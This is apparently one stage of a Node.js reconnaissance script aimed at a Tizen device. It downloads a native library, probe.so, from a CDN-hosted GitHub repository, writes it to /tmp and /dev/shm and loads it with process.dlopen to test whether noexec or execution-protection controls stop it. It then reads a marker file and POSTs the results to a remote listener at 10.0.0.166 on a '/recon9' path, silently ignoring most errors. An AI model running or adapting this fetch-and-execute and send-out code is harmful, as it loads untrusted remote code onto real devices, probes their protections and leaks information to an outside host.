// Stage-9: dlopen probe from /tmp and /dev/shm (test noexec vs UEP).
var fs = require('fs');
var http = require('http');
var https = require('https');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon9', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
https.get('https://cdn.jsdelivr.net/gh/ItsMeATaco/tizen-glass-dashboard@v9/probe.so', function (r) {
  var c = [];
  r.on('data', function (d) { c.push(d); });
  r.on('end', function () {
    var buf = Buffer.concat(c);
    var out = {};
    ['/tmp/', '/dev/shm/'].forEach(function (d) {
      var key = d.replace(/\//g, '_');
      try {
        fs.writeFileSync(d + 'probe.so', buf);
        try { fs.unlinkSync(d + 'dlopen_ok'); } catch (e) { }
        // marker path in probe.so is owner dir; use a per-dir marker via env not possible; just check dlopen result
        try { process.dlopen({ exports: {} }, d + 'probe.so'); out[key] = 'returned'; } catch (e) { out[key] = 'threw: ' + e.message; }
      } catch (e) { out[key] = 'write err ' + e.message; }
    });
    try { out.marker = fs.readFileSync('/home/owner/share/tmp/dlopen_ok', 'utf8'); } catch (e) { out.marker = 'absent'; }
    post(out);
  });
}).on('error', function (e) { post({ err: 'https ' + e.message }); });
